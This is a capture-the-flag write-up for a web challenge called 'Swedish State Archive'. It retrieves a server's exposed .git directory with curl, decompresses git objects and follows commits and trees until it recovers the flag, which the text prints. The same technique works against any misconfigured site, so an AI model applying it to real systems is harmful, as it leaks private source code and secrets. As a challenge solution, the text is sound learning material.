# Swedish State Archive
---
## Solution
1. First we see in server.py, the "git" is mis spell, so we can see if there's flag in git history
        
    ![](https://i.imgur.com/9gwJC2f.png)

2. first, get the latest commit by use
    ```zsh
    curl http://13.53.175.227:50000/.git/refs/heads/master
    ```
    we get the hash vaule of the commit - e4729652052522a5a16615f0005f9c4dac8a08c1
3. the real commit object is store in the .git/objects/, each object is store in the directory whose name is first two hash value, in this problem, the latest commit object is in
    ```
    .git/objects/e4/729652052522a5a16615f0005f9c4dac8a08c1
     ```
     so use following command to get commit content
     ```zsh
     curl -s http://13.53.175.227:50000/.git/objects/e4/729652052522a5a16615f0005f9c4dac8a08c1 | pigz -d
     ```
     the content is
     ```git
     commit 243tree 5e72097f3b99ce5936bff7c3b864ef6c7a0dae85
    parent 0bba32f12b0b1dd8df052ebf3607dadccb9350d7
    author Travis CI User <travis@example.org> 1576308513 +0000
    committer Travis CI User <travis@example.org> 1576308513 +0000

    Make things a bit tighter
     ```
4. We can trace the previous commit by access the parent hash and see the commit file in the tree object, ie use
    ```zsh
    curl -s http://13.53.175.227:50000/.git/objects/0b/ba32f12b0b1dd8df052ebf3607dadccb9350d7 | pigz -d
    ```
     to see the previouse commit.
     and use
     ```zsh
    curl -s http://13.53.175.227:50000/.git/objects/5e/72097f3b99ce5936bff7c3b864ef6c7a0dae85 | pigz -d
     ```
5. After trace few commit, we can see a commit which content is
    ```git
    commit 243tree 326cb05f3fcbdf63aef0177fee81623ff4619398
    parent 0d244f764db9257b18dd84f5830ff958e7b2571d
    author Travis CI User <travis@example.org> 1576308513 +0000
    committer Travis CI User <travis@example.org> 1576308513 +0000

    did some work on flag.txt
    ```
    and to get the tree to see what is update in this commit, use
    ```zsh
    curl -s http://13.53.175.227:50000/.git/objects/32/6cb05f3fcbdf63aef0177fee81623ff4619398 | pigz -d
    ```
    and the content is
    ```
    tree 154100644 flag.txt�F�
    ��3gZ.��\~�.100644 folder.htmlV6�kŐfd�1�����	�100644index.html.�D����4��]�v.A�0�100644 web_server.py���d^dC�D+��5\�
    ```
6. the code after flag.txt is actually the hash value of flag.txt file, thus use
    ```zsh
    curl -s http://13.53.175.227:50000/.git/objects/ef/460ecd090b93b133675a0560eb15ae5c7ef822 | pigz -d
    ```
    the we can get the flag watevr{everything_is_offentligt}
